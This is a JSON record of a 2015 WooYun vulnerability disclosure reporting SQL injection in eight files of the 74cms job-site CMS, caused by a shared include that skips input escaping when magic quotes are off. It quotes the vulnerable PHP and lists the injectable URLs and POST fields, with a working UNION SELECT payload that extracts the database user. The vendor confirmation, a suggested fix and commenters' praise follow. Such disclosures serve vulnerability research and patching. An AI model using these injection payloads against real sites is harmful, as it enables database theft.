{"id": 71271, "wybug_id": "wooyun-2015-0137002", "wybug_title": "74cms 20150817 设计缺陷导致8处不同文件注入(gpc=off)", "wybug_corp": "74c,s.com", "wybug_author": "′雨。", "wybug_date": "2015-08-26 10:50", "wybug_open_date": "2015-11-24 10:58", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-29：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-10-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-10-30：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-11-24：\t细节向公众公开  简要描述： 直接出数据。 详细说明：  http://download.74cms.com/download/74cms_v3.6_beta_20150817.zip下载地址。74cms的全局文件是include/common.inc.php 其中里面有\nif (!empty($_GET)){$_GET  = help::addslashes_deep($_GET);}if (!empty($_POST)){$_POST = help::addslashes_deep($_POST);}$_COOKIE   = help::addslashes_deep($_COOKIE);$_REQUEST  = help::addslashes_deep($_REQUEST);\n但是当看到plus/ajax_common.php的时候发现他包含的是\n* ---------------------------------------------------------------------------- * 这不是一个自由软件！您只能在不用于商业目的的前提下对程序代码进行修改和 * 使用；不允许对程序代码以任何形式任何目的的再发布。 * ============================================================================*/define('IN_QISHI', true);require_once(dirname(dirname(__FILE__)).'/include/plus.common.inc.php');$act = !empty($_GET['act']) ? trim($_GET['act']) : '';\nplus.common.inc.php 来看看\nif(!defined('IN_QISHI')) exit('Access Denied!');define('QISHI_ROOT_PATH', dirname(dirname(__FILE__)).'/');error_reporting(E_ERROR);require_once(QISHI_ROOT_PATH.'data/config.php');ini_set('session.save_handler', 'files');session_save_path(QISHI_ROOT_PATH.'data/sessions/');session_start();header(\"Content-Type:text/html;charset=\".QISHI_CHARSET);require_once(QISHI_ROOT_PATH.'include/mysql.class.php');$db = new mysql($dbhost,$dbuser,$dbpass,$dbname);require_once(QISHI_ROOT_PATH.'include/common.fun.php');PHP_VERSION > '5.1'?date_default_timezone_set(\"PRC\"):'';$timestamp = time();$online_ip=getip();$ip_address=convertip($online_ip);$_CFG=get_cache('config');$_PAGE=get_cache('page');$_NAV=get_cache('nav');$_CFG['wap_domain'] = $_CFG['wap_domain']==\"\"?$_CFG['site_domain'].$_CFG['site_dir'].\"m\":$_CFG['wap_domain'];$_CFG['version']=QISHI_VERSION;$_CFG['web_logo']=$_CFG['web_logo']?$_CFG['web_logo']:'logo.gif';$_CFG['upfiles_dir']=$_CFG['site_dir'].\"data/\".$_CFG['updir_images'].\"/\";$_CFG['site_template']=$_CFG['site_dir'].'templates/'.$_CFG['template_dir'];execution_crons();\n并没有对GET POST COOKIE 转义。。导致了在gpc off的情况下 可闭合。我把所有包含的是这个文件的都看了一下。在plus/ajax_common.php中\nelseif($act==\"hotword\"){\tif (empty($_GET['query']))\t{\texit();\t}\t$gbk_query=trim($_GET['query']);\tif (strcasecmp(QISHI_DBCHARSET,\"utf8\")!=0)\t{\t$gbk_query=utf8_to_gbk($gbk_query);\t}\t$sql=\"SELECT * FROM \".table('hotword').\" WHERE w_word like '%{$gbk_query}%' ORDER BY `w_hot` DESC LIMIT 0 , 10\";\t$result = $db->query($sql);\twhile($row = $db->fetch_array($result))\t{\t\t$list[]=\"'\".$row['w_word'].\"'\";\t}\tif ($list)\t{\t$liststr=implode(',',$list);\t$str=\"{\";\t$str.=\"query:'{$gbk_query}',\";\t$str.=\"suggestions:[{$liststr}]\";\t$str.=\"}\";\texit($str);\t}}\n可注入。 最新版的防注入轻松过。其他地方的注入代码都不分析了,一样的原理。\n\n直接出数据。1: localhost/web/74cms/plus/ajax_common.php?query=' and 0  union select 1,user(),3 and '&act=hotword2： localhost/web/74cms/plus/ajax_map.php?jobshow=key:::a'3： localhost/web/74cms/plus/ajax_user.php?act=check_usnamePOST：usname=a' and xxx4: localhost/web/74cms/plus/ajax_street.php?act=alphabet&x=a' and o5: localhost/web/74cms/m/plus/wap_ajax.php?act=ajaxjobslist&key=a'6: localhost/web/74cms/m/connect_qq_client.php?act=binding_callback&openid=1' and7: localhost/web/74cms/user/connect_qq_client.php?act=login_go&openid=a' and8: localhost/web/74cms/user/plus/ajax_user.php?act=check_emailPOST:email=a' and都直接报错。   漏洞证明：  localhost/web/74cms/plus/ajax_common.php?query=' and 0  union select 1,user(),3 and '&act=hotword\n\n   修复方案：  plus.common中也对GPC 转义   版权声明：转载请注明来源 ′雨。@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-08-26 10:56 厂商回复： 感谢反馈！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-08-26 10:51 |    \t\tM4sk \t\t\t( 普通白帽子  |\t\t\t        Rank:1213 漏洞数:321        | 国内信息安全任重而道远，还需要厂商和白帽...)\t\t \n  雨神6666666    \n     2015-08-26 10:52 |    \t\tHackPanda \t\t\t( 普通白帽子  |\t\t\t        Rank:117 漏洞数:16        | Talk is cheap,show me the shell.)\t\t \n  雨牛干上了    \n     2015-08-26 10:53 |    \t\t玉林嘎 \t\t\t( 普通白帽子  |\t\t\t        Rank:798 漏洞数:99        )\t\t \n  雨牛 别这样。。    \n     2015-08-26 10:53 |    \t\t猴子搬来的救兵 \t\t\t( 路人 |\t\t\t        还没有发布任何漏洞        | 专注于Android平台漏洞发现)\t\t \n  最近74cms曝光率很高，一上午看见两次了。    \n     2015-08-26 11:00 |    \t\t牛肉包子 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:64        )\t\t \n  @玉林嘎 哈哈    \n     2015-08-26 11:03 |    \t\t玉林嘎 \t\t\t( 普通白帽子  |\t\t\t        Rank:798 漏洞数:99        )\t\t \n  @牛肉包子 他一交我那个首页就被下了..    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}